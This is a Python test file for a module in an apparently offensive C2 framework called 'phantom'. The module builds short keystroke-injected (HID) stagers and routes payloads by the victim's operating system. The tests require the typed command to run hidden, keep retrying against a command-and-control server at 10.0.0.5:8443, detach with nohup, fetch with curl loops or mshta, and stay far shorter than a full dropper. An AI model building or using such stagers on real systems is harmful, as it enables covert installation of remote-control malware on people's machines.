"""Short resilient HID stager (this phase).

Pins that the typed command is SHORT (vs the 11k full stager), that it is
hidden and retries on a cold C2, and that server-side OS detection drives
delivery for a single typed payload.
"""
import unittest

from phantom.utils import short_stager as ss
from phantom.utils.builder import generate_dropper


class TestDetectPlatform(unittest.TestCase):
    def test_common_uas(self):
        self.assertEqual(ss.detect_platform(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"), "windows")
        self.assertEqual(ss.detect_platform(
            "Mozilla/5.0 (X11; Linux x86_64)"), "linux")
        self.assertEqual(ss.detect_platform(
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"), "macos")
        self.assertEqual(ss.detect_platform(
            "Mozilla/5.0 (Linux; Android 13)"), "android")

    def test_unknown_is_conservative(self):
        self.assertEqual(ss.detect_platform(""), "unknown")
        self.assertEqual(ss.detect_platform("curl/8.0"), "unknown")

    def test_payload_route(self):
        self.assertEqual(ss.payload_route("windows"), "/api/v1/payload")
        self.assertEqual(ss.payload_route("windows", pic=True), "/x")
        self.assertEqual(ss.payload_route("linux"), "/api/v1/payload_linux")
        self.assertEqual(ss.payload_route("unknown"), "")

    def test_delivery_for(self):
        plat, url = ss.delivery_for(
            "Mozilla/5.0 (Windows NT 10.0)", "https://10.0.0.5:8443",
            token="tok")
        self.assertEqual(plat, "windows")
        self.assertEqual(url, "https://10.0.0.5:8443/api/v1/payload?auth=tok")
        plat, url = ss.delivery_for("curl/8", "https://h")
        self.assertEqual((plat, url), ("unknown", ""))


class TestShortStager(unittest.TestCase):
    def test_windows_is_hidden_and_resilient(self):
        cmd = ss.build_short_stager(
            "windows", "https://10.0.0.5:8443/s", host="10.0.0.5", port=8443)
        self.assertIn("-w h", cmd)                 # hidden
        self.assertIn("while(1)", cmd)             # retry loop
        self.assertIn("sleep", cmd)                # cadence
        self.assertIn("10.0.0.5", cmd)

    def test_windows_mshta_is_shortest_but_one_shot(self):
        cmd = ss.build_short_stager(
            "windows", "https://h/s", loader="mshta")
        self.assertTrue(cmd.startswith("mshta "))
        self.assertNotIn("while", cmd)             # not resilient

    def test_windows_short_is_far_shorter_than_the_full_stager(self):
        short = ss.build_short_stager("windows", "https://10.0.0.5:8443/s")
        try:
            full = generate_dropper("windows", "10.0.0.5", 8443,
                                    use_ssl=True, resilient=True)
        except Exception:
            self.skipTest("full stager unavailable in this env")
        self.assertLess(len(short), 300)
        self.assertGreater(len(full), 3000)
        self.assertLess(len(short), len(full) // 10)

    def test_linux_is_resilient_and_detached(self):
        cmd = ss.build_short_stager(
            "linux", "https://10.0.0.5:8443/p", host="10.0.0.5", port=8443)
        self.assertIn("while ! curl", cmd)
        self.assertIn("nohup", cmd)
        self.assertIn("10.0.0.5", cmd)

    def test_macos_supported(self):
        cmd = ss.build_short_stager("macos", "https://h/p",
                                    host="h", port=443)
        self.assertIn("while ! curl", cmd)

    def test_rejects_empty_url_and_unknown_platform(self):
        with self.assertRaises(ValueError):
            ss.build_short_stager("windows", "")
        with self.assertRaises(ValueError):
            ss.build_short_stager("amiga", "https://h/s")
        with self.assertRaises(ValueError):
            ss.build_short_stager("windows", "https://h/s", loader="nope")

    def test_retry_cadence_is_honoured(self):
        cmd = ss.build_short_stager("windows", "https://h/s", retry_s=7)
        self.assertIn("sleep 7", cmd)

    def test_universal_fetch_is_just_the_url(self):
        self.assertEqual(ss.build_universal_fetch("https://h/x"),
                         "https://h/x")

    def test_loader_notes_explain_the_tradeoff(self):
        notes = ss.loader_notes("windows", "mshta")
        self.assertTrue(any("SINGLE shot" in n for n in notes))
        self.assertEqual(ss.loader_notes("linux"), ())


if __name__ == "__main__":
    unittest.main()
